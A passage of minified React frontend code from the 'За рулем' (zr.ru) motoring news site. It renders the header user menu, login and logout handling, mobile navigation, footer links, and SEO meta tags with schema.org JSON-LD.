          })(["position:absolute;top:100%;padding-top:0.5625rem;right:-0.4375rem;display:none;"]),
          Me = s.ZP.div.withConfig({
            displayName: "styled__UserWrap",
            componentId: "sc-1aty3gd-2"
          })(['position:relative;border-radius:0.1875rem;background:#fff;box-shadow:0 0.5rem 1rem 0 rgb(0 0 0 / 32%);width:10.75rem;padding:0.75rem 0.9375rem 0.75rem;box-sizing:border-box;&:before{content:"";background:#fff;position:absolute;width:1rem;height:1rem;transform:rotate(-45deg);top:-0.1875rem;right:0.875rem;}']),
          de = s.ZP.div.withConfig({
            displayName: "styled__UserLink",
            componentId: "sc-1aty3gd-3"
          })(["margin-bottom:0.1875rem;color:#000;&:last-child{margin-top:0.625rem;}&:first-child{margin-bottom:0.625rem;}", ""], (0, M.fq)("$isMobile", (0, s.iv)(["margin:0;display:inline-block;padding:0.8rem 6px;color:#3d484a;&:last-child{margin-top:0;}"]))),
          ge = s.ZP.div.withConfig({
            displayName: "styled__UserDetail",
            componentId: "sc-1aty3gd-4"
          })(["display:block;width:2rem;height:2rem;border-radius:50%;overflow:hidden;cursor:pointer;box-shadow:0 0 0.625rem 0 rgb(0 0 0 / 70%);margin-left:1.1875rem;&:hover{border-color:transparent;", "{display:block;}}img{width:100%;height:100%;}", ""], se, (0, M.fq)("$isMobile", (0, s.iv)(["display:inline-block;vertical-align:middle;box-shadow:none;margin-left:0;width:48px;height:48px;"]))),
          ue = s.ZP.div.withConfig({
            displayName: "styled__AuthorizedUser",
            componentId: "sc-1aty3gd-5"
          })(["position:relative;"]),
          me = i(2876),
          pe = i(8608);
        function ye(e) {
          var t = e.user,
            i = e.logout,
            n = t.href,
            r = t.name;
          return l.createElement(se, null, l.createElement(Me, null, l.createElement(d.rH, {
            href: n || "",
            color: "#970000"
          }, r), [{
            url: "lenta/",
            title: "Моя лента"
          }, {
            url: "favorites/",
            title: "Избранное"
          }, {
            url: "edit/",
            title: "Настройки профиля"
          }, {
            url: "/logout/",
            title: "Выход"
          }].map(function (e) {
            var t = e.url,
              r = e.title;
            return "/logout/" === t ? l.createElement(de, {
              key: t,
              onClick: i
            }, "Выход") : l.createElement(de, {
              key: t
            }, l.createElement(d.rH, {
              href: "".concat(n).concat(t),
              color: "#970000"
            }, r));
          })));
        }
        function Ie(e) {
          var t = e.isMobile,
            i = (0, c.I0)(),
            n = (0, l.useState)(!0),
            r = o()(n, 2),
            a = r[0],
            s = r[1],
            M = (0, l.useState)(!1),
            g = o()(M, 2),
            u = g[0],
            m = g[1],
            p = (0, c.v9)(te.CI),
            y = (0, c.v9)(te.Wb),
            I = function () {
              i((0, me.WM)(!0));
            },
            N = function () {
              oe.Z.remove("global_sid"), window.localStorage.removeItem("global_sid"), window.location.reload();
            };
          if ((0, l.useEffect)(function () {
            if (y) s(!1);else {
              var e = window.localStorage.getItem("global_sid") || oe.Z.get("global_sid");
              e ? (0, pe.b_)(e).then(function (e) {
                if (!e.result) throw new Error();
                i((0, me.$l)(e.result.user));
              }).finally(function () {
                return s(!1);
              }) : s(!1);
            }
          }, [y]), a) return l.createElement(ue, null);
          if (y) {
            var j = y.href;
            return l.createElement(ue, null, j && l.createElement(ge, {
              $isMobile: t
            }, l.createElement(d.qE, {
              user: y,
              size: 48
            }), !t && l.createElement(ye, {
              user: y,
              logout: N
            })), t && l.createElement(de, {
              $isMobile: t,
              onClick: function () {
                return N();
              }
            }, "Выход"));
          }
          return l.createElement(ue, null, t && l.createElement(l.Fragment, null, l.createElement(ge, {
            $isMobile: t
          }, l.createElement(d.qE, {
            user: y,
            size: 48
          })), l.createElement(de, {
            $isMobile: t,
            onClick: I
          }, "Вход")), !t && l.createElement(ce, {
            onClick: I
          }), p && l.createElement(le.Z, {
            setOpenAuth: function () {
              i((0, me.WM)(!1));
            },
            setSignIned: function () {
              m(!0);
            }
          }), u && l.createElement(d.bZ, {
            type: "success",
            code: "user_signed_up",
            onClose: function () {
              return m(!1);
            }
          }));
        }
        var Ne = i(6804);
        function je(e) {
          var t = e.isOpen,
            i = e.onClose,
            n = e.mainNav,
            r = e.nav,
            a = (0, c.v9)(te.lA),
            o = n || r;
          return l.createElement(U, {
            $isOpen: t
          }, l.createElement(E, null, l.createElement(Q, null, l.createElement(P, null, l.createElement(Ie, {
            isMobile: !0
          }), l.createElement(d.WG, {
            network: ["zen", "vk", "youtube", "tg", "viber", "ok"],
            width: 33,
            height: 32,
            dark: !0
          })), l.createElement(d.UI, null)), l.createElement(A, {
            onClick: i
          }, o && o.map(function (e) {
            var t = e.href,
              i = e.id,
              n = e.name,
              r = e.allLine;
            return "Магазин" === n ? null : "Гран-при" === n ? l.createElement(v, {
              href: g.kA.goods.href,
              weight: 700,
              target: e.blank ? "_blank" : "_top",
              $isUpperCase: !0,
              $fontSize: 22,
              $allLine: r
            }, l.createElement("span", null, g.kA.goods.name)) : l.createElement(v, {
              href: t,
              key: i,
              target: e.blank ? "_blank" : "_top",
              weight: 700,
              $isUpperCase: !0,
              $fontSize: 22,
              $allLine: r
            }, l.createElement("span", null, n));
          }), a && a.map(function (e) {
            var t = e.href,
              i = e.name;
            return l.createElement(v, {
              href: t,
              key: t
            }, l.createElement("span", null, i));
          }))));
        }
        function he(e, t) {
          var i = Object.keys(e);
          if (Object.getOwnPropertySymbols) {
            var n = Object.getOwnPropertySymbols(e);
            t && (n = n.filter(function (t) {
              return Object.getOwnPropertyDescriptor(e, t).enumerable;
            })), i.push.apply(i, n);
          }
          return i;
        }
        function xe(e) {
          for (var t = 1; t < arguments.length; t++) {
            var i = null != arguments[t] ? arguments[t] : {};
            t % 2 ? he(Object(i), !0).forEach(function (t) {
              r()(e, t, i[t]);
            }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(i)) : he(Object(i)).forEach(function (t) {
              Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(i, t));
            });
          }
          return e;
        }
        function De() {
          var e = (0, l.useState)(!1),
            t = o()(e, 2),
            i = t[0],
            n = t[1],
            r = (0, ie.Fs)().isMobile,
            a = (0, c.v9)(te.br),
            s = (0, c.v9)(te.$V),
            M = a.info.requestURI,
            d = (0, c.v9)(te.O2),
            g = (0, ne.$1)(M),
            y = (0, ne.uk)(d),
            I = g || y,
            N = I || {},
            x = N.sticker,
            D = N.widthSpecial,
            f = N.color,
            w = N.secondPromo,
            z = N.mainNav,
            T = N.secondMenu,
            L = N.logoLink,
            E = N.partnerLogo,
            A = D || [],
            b = o()(A, 2),
            v = b[0],
            O = b[1],
            k = (0, c.v9)(te.Zn),
            C = !!T,
            S = (0, c.v9)(te.UJ),
            Z = function () {
              n(!1);
            };
          return l.createElement(Ne.DB, {
            targeting: xe({}, s)
          }, l.createElement(Ne.Wr, {
            slot: "1",
            isVisible: [!0, !1]
          }), l.createElement(u, {
            id: "main-header",
            $hideOnGal: k
          }, l.createElement(m, null, l.createElement(B, null, l.createElement(p, {
            href: L || "/",
            label: "Лого ЗаРулем"
          }), I && l.createElement(l.Fragment, null, l.createElement(R, {
            $color: f,
            $desktopWidth: v,
            $mobileWidth: O
          }, l.createElement(H, {
            $color: f
          }, l.createElement("span", null, I.name))), x && l.createElement(F, null, l.createElement(K, {
            name: x,
            href: L || "",
            desktopWidth: 145,
            mobileWidth: 110,
            desktopFont: 17,
            mobileFont: 14,
            fontWeight: 700,
            color: "#ce0000",
            marginLeft: .5
          }))), !I && l.createElement(G, {
            href: "/tags/95-let-za-rulem/"
          })), l.createElement(ee, {
            mainNav: z,
            nav: S
          }), l.createElement(j, null, !E && l.createElement(l.Fragment, null, l.createElement(h, {
            onClick: function () {
              return n(!i);
            }
          }), !r && void 0 !== r && l.createElement(Ie, {
            isMobile: r
          })), E && l.createElement(W, {
            href: E.href,
            $image: E.image,
            target: E.blank ? "_blank" : "_self",
            color: "transparent"
          }))), l.createElement(re, {
            secondNav: T,
            disableControls: C,
            secondPromo: w
          }), r ? l.createElement(je, {
            isOpen: i,
            onClose: Z,
            mainNav: z,
            nav: S
          }) : l.createElement(ae, {
            isOpen: i,
            onClose: Z
          })));
        }
        var fe = i(405);
        function we(e) {
          var t = e.store,
            i = e.children,
            n = e.helmetContext;
          return l.createElement(fe.B, {
            context: n
          }, l.createElement(ie.Hd, null, l.createElement(c.zt, {
            store: t
          }, l.createElement(ie.ZL, null), i)));
        }
        var ze = s.ZP.div.withConfig({
            displayName: "styled__FooterTop",
            componentId: "sc-1jz9m5b-0"
          })(["display:flex;align-items:flex-start;"]),
          Te = s.ZP.nav.withConfig({
            displayName: "styled__FooterMenu",
            componentId: "sc-1jz9m5b-1"
          })(["display:flex;align-items:flex-start;flex-wrap:wrap;@media (max-width:1024px){display:none;}"]),
          Le = (0, s.ZP)(d.rH).withConfig({
            displayName: "styled__FooterMenuLink",
            componentId: "sc-1jz9m5b-2"
          })(["&:not(:last-child){margin-right:1.25rem;}"]),
          Ee = (0, s.ZP)(d.rH).withConfig({
            displayName: "styled__ItLink",
            componentId: "sc-1jz9m5b-3"
          })(["display:inline-block;"]),
          Ae = s.ZP.div.withConfig({
            displayName: "styled__FooterWrap",
            componentId: "sc-1jz9m5b-4"
          })(["display:flex;align-items:flex-start;margin-left:auto;@media (max-width:1024px){display:none;}"]),
          be = (0, s.ZP)(d.rH).withConfig({
            displayName: "styled__FooterLogoLink",
            componentId: "sc-1jz9m5b-5"
          })(["width:11rem;height:2.3125rem;display:block;background:url(", ") no-repeat center center;&:hover{border-color:transparent;}@media (max-width:1024px){max-width:155px;height:33px;}"], "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyOTIgNjAiPjxsaW5lYXJHcmFkaWVudCBpZD0iYSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIHgxPSIxNDYiIHkxPSI2MiIgeDI9IjE0NiIgeTI9IjIiIGdyYWRpZW50VHJhbnNmb3JtPSJtYXRyaXgoMSAwIDAgLTEgMCA2MikiPjxzdG9wIG9mZnNldD0iMCIgc3RvcC1jb2xvcj0iI2ZmZiIvPjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iI2Q3ZDdkNyIvPjwvbGluZWFyR3JhZGllbnQ+PHBhdGggZD0iTTE3MS42IDE0LjlMMTQ4LjkgNjBoLTEzLjJsNi43LTEyLjYtMTAtMzIuNWgxMi41bDUuNiAxOS41IDguNC0xOS41aDEyLjd6bTE3LjMgMzUuOWw0LjEtMjdoLTYuN2MtMS45IDguMS0yLjEgOS4xLTIuNCAxMC0xLjkgOC4yLTQuNSAxNi44LTE4LjMgMThsLTEuOC05LjVjMy45LS44IDUuNy0xLjcgNy4zLTQuMiAxLTEuNyAyLjEtNC41IDQuNi0xNS4xbDEuOS04LjFoMjguNmwtNS41IDM1LjloLTExLjh6bTU0LjcgMGw4LjctMzUuOWgxMi44bDUuMiAxNy4xIDkuNC0xNy4xSDI5MnYzNS45aC0xMS42bC4yLTE4LjktMTAuNSAxOC45aC01LjNMMjU4LjkgMzJsLTQuMSAxOC44aC0xMS4yek02LjkgMy4xQzEyLjUuNyAxNy44IDAgMjMuNiAwIDMwLjkgMCAzOS44IDMuNCA0MCAxMi45Yy4xIDUuMy0yLjEgOS41LTcuOSAxMS44IDQuNiAxLjYgNi42IDUuOSA2LjYgMTAuMyAwIDEyLTExLjEgMTYuOC0yMS4yIDE2LjgtNS41IDAtMTIuNi0xLjMtMTcuNS00LjFsMS45LTEwLjhjNC42IDIuNiA5LjQgNC4yIDE0LjkgNC4yIDQuMSAwIDguNC0xLjIgOC40LTUuOCAwLTQuMS0zLjUtNC44LTcuMy00LjhIMTBsMS40LTEwLjNoNy4xYzQuMiAwIDguNi0uNyA4LjUtNS41LS4yLTMuOS01LjEtNC4yLTcuNC00LjItNS41LjEtOS41IDEuMy0xNC43IDQuM2wyLTExLjd6bTIzNS4zIDMyLjRIMjIwYy0uMiA2LjcgNC43IDcuNSA3LjQgNy41IDQuNyAwIDguOS0xIDEzLjEtMy4zbC0xLjQgOS40Yy00LjYgMi4zLTkuMiAzLTE0LjIgMy0xNS40IDAtMTcuMS0xMS0xNy4xLTE2LjYuMS0xMiA2LjgtMjEuNyAxOS44LTIxLjcgMTMuNC0uMSAxNi4yIDExLjMgMTQuNiAyMS43em0tMTUuNC0xMy45Yy00LjYgMC01LjkgNC02LjUgNy45SDIzMWMuNC0zLjIuNC03LjktNC4yLTcuOXptLTE2MCAxLjdjLS41LS4yLTEuMi0uMy0xLjgtLjMtNi45IDAtMTEgNi41LTExIDEzLjUtLjEgMy42IDEuNSA1LjkgNC4yIDUuOSAxLjkgMCAzLjgtLjMgNS44LTIuNmwyLjgtMTYuNXptMTMtOC40bC01LjUgMzUuOUg2Mi45bC42LTRoLS4zYy0zLjMgNC4yLTcuMSA1LTkuOSA1LTcuMyAwLTExLjUtNC42LTExLjUtMTMuOCAwLTE1LjggMTAuOS0yNC4xIDI0LjktMjQuMSA1LjQgMCA5LjYuNSAxMy4xIDF6bTMyLjQtNC44bC0uOCA0LjhjMi40LS45IDMuNS0uOSA2LjQtLjkgOS4xIDAgMTQgNi4xIDE0IDE1LjMgMCAxNS4zLTkuOCAyMi4zLTIxLjIgMjIuMy0xLjkgMC00LS4yLTQuNy0uNGwtMS40IDloLTEybDUtMzEuNmgtLjNjLTEuOSAxLjQtNC42IDUuMS02LjEgNy4zLS41LjgtMSAxLjEtMS42LjhsLS4yLS4xYy0uNi0uMy0uOC0xLS4zLTIuMSAxLjgtNC4zIDQuNy0xMC4xIDkuNS0xMy44bDEuNy0xMC40IDEyLS4yem0tMi4xIDEzLjdsLTIuOSAxOGMuOS4zIDIgLjMgMi40LjMgNi41IDAgOS44LTUuOSA5LjctMTIuMS0uMS00LTItNi45LTUuOS02LjktMS43LS4xLTIuNy4zLTMuMy43eiIgZmlsbD0idXJsKCNhKSIvPjwvc3ZnPg=="),
          ve = s.ZP.div.withConfig({
            displayName: "styled__FooterBottom",
            componentId: "sc-1jz9m5b-6"
          })(["margin-top:1rem;display:flex;align-items:center;justify-content:space-between;@media (max-width:1024px){padding-bottom:12px;display:block;}"]),
          Oe = s.ZP.div.withConfig({
            displayName: "styled__FooterMobile",
            componentId: "sc-1jz9m5b-7"
          })(["display:none;@media (max-width:1024px){display:block;margin-top:4rem;", "{display:block;color:#999999;font-size:1.3125rem;margin-bottom:15px;line-height:1.5625rem;}}"], Le),
          ke = s.ZP.div.withConfig({
            displayName: "styled__FooterInfoLinks",
            componentId: "sc-1jz9m5b-8"
          })(["@media (max-width:1024px){display:none;}"]),
          Ce = s.ZP.div.withConfig({
            displayName: "styled__FooterInfo",
            componentId: "sc-1jz9m5b-9"
          })(["@media (max-width:1024px){display:flex;flex-flow:row;justify-content:space-between;align-items:center;}"]),
          Se = s.ZP.div.withConfig({
            displayName: "styled__MobileAge",
            componentId: "sc-1jz9m5b-10"
          })(["display:none;@media (max-width:1024px){display:block;}"]),
          Ze = (0, s.ZP)(d.WG).withConfig({
            displayName: "styled__FooterSocial",
            componentId: "sc-1jz9m5b-11"
          })(["margin-left:0.9375rem;@media (max-width:1024px){position:absolute;left:0;top:90px;margin-left:12px;}"]),
          Qe = s.ZP.div.withConfig({
            displayName: "styled__FooterPublish",
            componentId: "sc-1jz9m5b-12"
          })(["text-align:right;@media (max-width:1024px){display:none;}"]),
          Pe = (0, s.ZP)(d.Ee).withConfig({
            displayName: "styled__PartnerFooter",
            componentId: "sc-1jz9m5b-13"
          })(["margin-right:30px;margin-top:-12px;margin-bottom:26px;@media (max-width:1024px){display:block;position:relative;padding:0;max-width:100%;}"]),
          Ue = s.ZP.footer.withConfig({
            displayName: "styled__Footer",
            componentId: "sc-1jz9m5b-14"
          })(["position:relative;z-index:1;color:#b5b5b7;padding:0.75rem 1rem 1.6875rem 1.3125rem;background:", ";@media (max-width:1024px){padding:24px 12px 0 12px;}", ""], function (e) {
            return e.$back ? "url(".concat(e.$back, ")") : "#333";
          }, (0, M.fq)("$back", (0, s.iv)(["background-size:cover;@media (max-width:1024px){background-position:100% 0;", "{margin:auto;}", "{position:absolute;left:50%;top:50%;margin:auto;transform:translate(-50%,-50%);}}"], be, Ze)));
        const Ye = "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAiIGhlaWdodD0iMzAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0yIDguOSA5LjggMmgxMC40TDI4IDguOVYxNGgtM3YtM2gtMnYzaC0zdjJoM3YzaDJ2LTNoM3Y1LjFMMjAuMiAyOEg5LjhMMiAyMS4xVjguOVpNOSAwaDEybDkgOHYxNGwtOSA4SDlsLTktOFY4bDktOFptNiAyM2MtMiAwLTQtMi00LTR2LTdjMC0yIDItNCA0LTRoMWMyIDAgNCAyIDQgNGgtMmMwLTEtMS0yLTItMmgtMWMtMSAwLTIgMS0yIDJ2MmMwLS41IDEuNS0xIDItMWgxYzIgMCA0IDIgNCA0djJjMCAyLTIgNC00IDRoLTFabS0yLTRjMCAuOSAxIDIgMiAyaDFjMSAwIDItMSAyLTJ2LTJjMC0xLTEtMi0yLTJoLTFjLTEgMC0yIDEtMiAydjJabS03LTlWOC41aDN2MTRIN1YxMEg2WiIgZmlsbD0iI0I1QjVCNyIvPjwvc3ZnPg==";
        function _e() {
          var e = (0, c.v9)(te.Hp),
            t = (0, c.v9)(te.Cx),
            i = (0, ie.Fs)(),
            n = i.isMobile,
            r = i.isTablet,
            a = (0, c.v9)(te.br).info.requestURI,
            o = (0, c.v9)(te.O2),
            s = (0, ne.$1)(a),
            M = (0, ne.uk)(o),
            g = s || M || {},
            u = g.footer,
            m = g.mainNav,
            p = u || {},
            y = p.back,
            I = p.footerLogo,
            N = p.alt,
            j = m || e;
          return l.createElement(Ue, {
            $back: y
          }, l.createElement(ze, null, I && l.createElement(Pe, {
            url: I,
            noFormatUrl: !0,
            width: 90,
            height: 65,
            altText: N
          }), l.createElement(Te, null, j.map(function (e) {
            var t = e.href,
              i = e.name;
            return l.createElement(Le, {
              color: "#b5b5b7",
              href: t,
              key: t
            }, i);
          }), l.createElement(Le, {
            color: "#b5b5b7",
            href: "https://sub.zr.ru/?utm_source=zr&utm_medium=footer&utm_campaign=sub",
            target: "_blank"
          }, "Подписка")), l.createElement(Ae, null, l.createElement(d.Ee, {
            noFormatUrl: !0,
            url: Ye,
            width: 31,
            height: 31,
            altText: "16+"
          }), !n && l.createElement(d.UI, null))), l.createElement(ve, null, l.createElement(be, {
            href: "/",
            label: "Лого ЗаРулем"
          }), !n && !r && l.createElement(Le, {
            href: "/it-activities/",
            color: "#b5b5b7",
            width: 201,
            fontSize: 12
          }, "ИНФОРМАЦИЯ О ДЕЯТЕЛЬНОСТИ ООО «ЗА РУЛЕМ» В ОБЛАСТИ ИНФОРМАЦИОННЫХ ТЕХНОЛОГИЙ")), l.createElement(ve, null, l.createElement(Oe, null, l.createElement(Le, {
            color: "#b5b5b7",
            href: "#"
          }, "Версия для ПК"), l.createElement(Le, {
            color: "#b5b5b7",
            href: "https://sub.zr.ru/?utm_source=zr&utm_medium=footer&utm_campaign=sub",
            target: "_blank"
          }, "Подписка"), l.createElement(Ee, {
            href: "/it-activities/",
            color: "#b5b5b7",
            width: 280,
            fontSize: 12
          }, "ИНФОРМАЦИЯ О ДЕЯТЕЛЬНОСТИ ООО «ЗА РУЛЕМ» В ОБЛАСТИ ИНФОРМАЦИОННЫХ ТЕХНОЛОГИЙ")), l.createElement(Ce, null, l.createElement("div", null, "© 1928-", t, " Интернет издание «За рулем»"), l.createElement(Se, null, l.createElement(d.Ee, {
            noFormatUrl: !0,
            url: Ye,
            width: 31,
            height: 31,
            altText: "16+"
          })), l.createElement(ke, null, l.createElement(d.rH, {
            href: "/about/",
            color: "#b5b5b7"
          }, "Об издании"), " • ", l.createElement(d.rH, {
            href: "/editorial/",
            color: "#b5b5b7"
          }, "Редакция"), " • ", l.createElement(d.rH, {
            href: "/legal/",
            color: "#b5b5b7"
          }, "Правовая информация"), " • ", l.createElement(d.rH, {
            href: "/contacts/",
            color: "#b5b5b7"
          }, "Контакты"), " • ", l.createElement(d.rH, {
            href: "https://www.zr.ru/d/textpage/52/82/media-kit_zr_2023.pdf",
            color: "#b5b5b7",
            target: "_blank"
          }, "Медиа-кит"))), l.createElement(Ze, {
            network: ["vk", "youtube", "tg", "viber", "ok", "rss"],
            width: 36,
            height: 37
          }), !I && l.createElement(Qe, null, l.createElement("div", null, l.createElement(d.rH, {
            href: "/corp/",
            color: "#b5b5b7"
          }, "Реклама «За рулем»")), l.createElement(d.rH, {
            href: "https://reis.zr.ru/",
            color: "#b5b5b7",
            target: "_blank"
          }, "Рейс.РФ"), " • ", l.createElement(d.rH, {
            href: "/archive/",
            color: "#b5b5b7"
          }, "Архив"), " • ", l.createElement(d.rH, {
            target: "_blank",
            href: "https://sub.zr.ru/?utm_source=zr&utm_medium=footer&utm_campaign=sub",
            color: "#b5b5b7"
          }, "Подписка"))));
        }
        var We = i(4193),
          Ge = (i(7004), i(9735)),
          Re = (i(8929), i(9077), i(4686), i(4198)),
          He = i(369),
          Be = s.ZP.div.withConfig({
            displayName: "styled__PageWrap",
            componentId: "sc-5iquy5-0"
          })(["box-shadow:0 0 11px rgb(0 0 0 / 30%);position:relative;z-index:2;background:#fff;width:", "px;min-height:1000px;@media (min-width:1700px){margin:0 auto;}@media (max-width:1365px){width:", "px;}@media (max-width:1024px){width:100%;}"], g.wB, g.Fk),
          Fe = s.ZP.div.withConfig({
            displayName: "styled__PageChildren",
            componentId: "sc-5iquy5-1"
          })(["position:relative;z-index:1;min-height:1000px;width:100%;"]),
          Je = i(236);
        function Ve(e) {
          var t = e.story,
            i = (0, c.v9)(te.br).info,
            n = (t || {}).picture;
          if (!n) return null;
          var r = "https://".concat(i.serverName).concat(n.href ? n.href : n.servingUrl);
          return l.createElement(fe.q, null, l.createElement("meta", {
            name: "og:image",
            content: r
          }), l.createElement("link", {
            rel: "image_src",
            href: r
          }), l.createElement("meta", {
            name: "twitter:image:src",
            content: r
          }), l.createElement("meta", {
            name: "vk:image",
            content: r
          }), l.createElement("meta", {
            property: "og:image:width",
            content: "1200"
          }), l.createElement("meta", {
            property: "og:image:height",
            content: "630"
          }));
        }
        function $e(e) {
          var t = e.pollTitle,
            i = ((0, c.v9)(te.au).main || {}).story,
            n = (0, c.v9)(te.br).info,
            r = n.serverName,
            a = n.requestURI,
            o = n.name,
            s = (0, c.v9)(te.nK) ? t : o,
            M = s && s.replace(/"/g, '\\"'),
            d = i && i.rubrics,
            g = d && d[0],
            u = i && i.name && i.name.replace(/"/g, '\\"');
          return "/" === a || i ? i ? l.createElement(fe.q, null, l.createElement("script", {
            type: "application/ld+json"
          }, '{\n                    "@context": "https://schema.org",\n                    "@type": "BreadcrumbList",\n                    "itemListElement": [\n                        {\n                            "@type": "ListItem",\n                            "position": 1,\n                            "name": "За Рулем",\n                            "item": "https://'.concat(r, '/"\n                        },{\n                            "@type": "ListItem",\n                            "position": 2,\n                            "name": "').concat(null == g ? void 0 : g.name, '",\n                            "item": "https://').concat(r).concat(null == g ? void 0 : g.href, '"\n                        },{\n                            "@type": "ListItem",\n                            "position": 3,\n                            "name": "').concat(u, '",\n                            "item": "https://').concat(r).concat(i.href, '"\n                        }\n                    ]\n                    }'))) : null : l.createElement(fe.q, null, l.createElement("script", {
            type: "application/ld+json"
          }, '{\n                    "@context": "https://schema.org",\n                    "@type": "BreadcrumbList",\n                    "itemListElement": [\n                        {\n                            "@type": "ListItem",\n                            "position": 1,\n                            "name": "За Рулем",\n                            "item": "https://'.concat(r, '/"\n                        },{\n                            "@type": "ListItem",\n                            "position": 2,\n                            "name": "').concat(M, '",\n                            "item": "https://').concat(r).concat(a, '"\n                        }\n                    ]\n                    }')));
        }
        function qe(e) {
          var t = e.title,
            i = e.url,
            n = e.description,
            r = {
              "@context": "https://schema.org",
              "@type": "WebPage",
              url: "".concat(i),
              mainEntityOfPage: "".concat(i),
              name: "".concat(t),
              headline: "".concat(t),
              description: "".concat(n),
              genre: "Новости"
            };
          return l.createElement(l.Fragment, null, l.createElement(fe.q, null, l.createElement("script", {
            type: "application/ld+json"
          }, '{\n                    "@context": "https://schema.org/",\n                    "@type":"Organization",\n                    "name":"За Рулем",\n                    "url":"https://www.zr.ru/",\n                    "logo":{\n                        "@type":"ImageObject",\n                        "url":" https://www.zr.ru/f/media/logo-zr-schema.png",\n                        "contentUrl":"https://www.zr.ru/f/media/logo-zr-schema.png",\n                        "width":292,\n                        "height":75\n                        },\n                    "address": {\n                        "@type": "PostalAddress",\n                        "streetAddress": "Селивёрстов переулок, 10с1",\n                        "addressLocality": "Москва",\n                        "addressRegion": "Москва",\n                        "postalCode": "107045",\n                        "addressCountry": {\n                          "@type": "Country",\n                          "name":"Россия"\n                      }\n                    },\n                    "telephone": "8(495)607-27-33",\n                    "sameAs":\n                    ["https://ru.wikipedia.org/wiki/%D0%97%D0%B0_%D1%80%D1%83%D0%BB%D1%91%D0%BC",\n                    "https://twitter.com/zr_ru",\n                    "https://vk.com/zronline",\n                    "https://www.facebook.com/ZRulem",\n                    "https://www.youtube.com/user/tvzrru",\n                    "https://www.instagram.com/zr_ru/",\n                    "https://zen.yandex.ru/zr.ru",\n                    "https://news.google.com/publications/CAAqBwgKMMuFhQsw-p-CAw?oc=3&ceid=RU:ru"]\n                }'), l.createElement("script", {
            type: "application/ld+json"
          }, '{\n                    "@context":"https://schema.org",\n                    "@type":"WebSite",\n                    "name":"За Рулем",\n                    "description": "Официальный сайт журнала «За рулем». Ежедневные автомобильные новости и статьи, тесты, характеристики и подбор машин. Машину повредили на платной стоянке. А виноваты - вы! - сайт «За рулем»",\n                    "image": "https://www.zr.ru/f/media/logo-zr-schema.png",\n                    "url":"https://www.zr.ru",\n                    "potentialAction":{\n                        "@type":"SearchAction",\n                        "target": {\n                          "@type": "EntryPoint",\n                           "urlTemplate": "https://www.zr.ru/search/?q={query}"\n                          },\n                          "query-input": {\n                          "@type": "PropertyValueSpecification",\n                          "valueRequired": "http://schema.org/True",\n                          "valueName": "query"\n                          }\n                    }\n                }'), l.createElement("script", {
            type: "application/ld+json"
          }, JSON.stringify(r))), l.createElement($e, {
            pollTitle: t
          }));
        }
        var Xe = i(9386);
        function Ke(e) {
          var t = e.story,
            i = (0, c.v9)(te.br).info,
            n = t || {},
            r = n.authors,
            a = n.tags,
            o = n.name,
            s = n.dateISO,
            M = n.href,
            d = n.announcementXml,
            g = n.visitCounter,
            u = n.files,
            m = n.doNotShowInGN,
            p = r && r.map(function (e) {
              return {
                "@type": "Person",
                name: "".concat((null == e ? void 0 : e.name) || "За Рулем"),
                url: "https://".concat(i.serverName).concat(null == e ? void 0 : e.href),
                image: "".concat(e.avatar ? "https://www.zr.ru".concat(e.avatar.servingUrl) : "".concat(Xe.Z))
              };
            }),
            y = u && u.map(function (e) {
              return {
                "@type": "ImageObject",
                contentURL: "https://img.zr.ru".concat(e.servingUrl)
              };
            }),
            I = {
              "@context": "https://schema.org",
              "@type": "NewsArticle",
              mainEntityOfPage: {
                "@type": "WebPage",
                "@id": "https://".concat(i.serverName).concat(M)
              },
              headline: "".concat(o),
              name: "".concat(o),
              url: "https://www.zr.ru".concat(M),
              description: "".concat(d),
              inLanguage: "ru",
              datePublished: "".concat(s),
              author: p,
              image: y,
              publisher: {
                "@type": "Organization",
                name: "За Рулем",
                logo: {
                  "@type": "ImageObject",
                  url: "https://www.zr.ru/f/media/logo-zr-schema.png"
                }
              },
              interactionStatistic: {
                "@type": "InteractionCounter",
                userInteractionCount: "".concat(g || 0),
                interactionType: {
                  "@type": "Action",
                  name: "http://schema.org/ViewAction"
                }
              },
              about: a ? a.map(function (e) {
                return {
                  "@type": "CreativeWork",
                  name: "".concat(e.name)
                };
              }) : null
            };
          return l.createElement(fe.q, null, t && l.createElement("script", {
            type: "application/ld+json"
          }, JSON.stringify(I)), m && l.createElement("meta", {
            name: "googlebot",
            content: "noindex, nofollow"
          }));
        }
        function et(e) {
          var t = e.metaTitle,
            i = e.story,
            n = (0, c.v9)(te.br),
            r = (0, c.v9)(te.au),
            a = (0, Je.ZQ)(),
            o = (0, Je.PK)(),
            s = n.info,
            M = s.requestURI,
            d = s.serverName,
            g = r.main,
            u = g && g.story,
            m = i || u,
            p = function () {
              return m && "_docs" === m._type ? "https://".concat(d).concat(M) : m && m.href ? "https://".concat(d).concat(m.href) : "https://".concat(d).concat(M);
            };
          return l.createElement(l.Fragment, null, l.createElement(fe.q, null, l.createElement("title", null, t || a), l.createElement("meta", {
            name: "og:title",
            content: a
          }), l.createElement("meta", {
            name: "twitter:title",
            content: a
          }), l.createElement("meta", {
            name: "og:type",
            content: u ? "article" : "website"
          }), l.createElement("meta", {
            name: "og:description",
            content: o
          }), l.createElement("meta", {
            name: "description",
            content: o
          }), l.createElement("meta", {
            name: "twitter:description",
            content: o
          }), l.createElement("link", {
            rel: "canonical",
            href: p()
          }), l.createElement("meta", {
            name: "og:url",
            content: p()
          }), l.createElement("meta", {
            name: "twitter:url",
            content: p()
          }), l.createElement("meta", {
            name: "twitter:domain",
            content: "zr.ru"
          }), l.createElement("meta", {
            name: "twitter:card",
            content: "summary_large_image"
          }), l.createElement("meta", {
            name: "twitter:site",
            content: "@zr_ru"
          }), l.createElement("meta", {
            name: "twitter:creator",
            content: "@zr_ru"
          }), l.createElement("meta", {
            property: "og:site_name",
            content: "zr.ru"
          }), u && l.createElement("meta", {
            name: "robots",
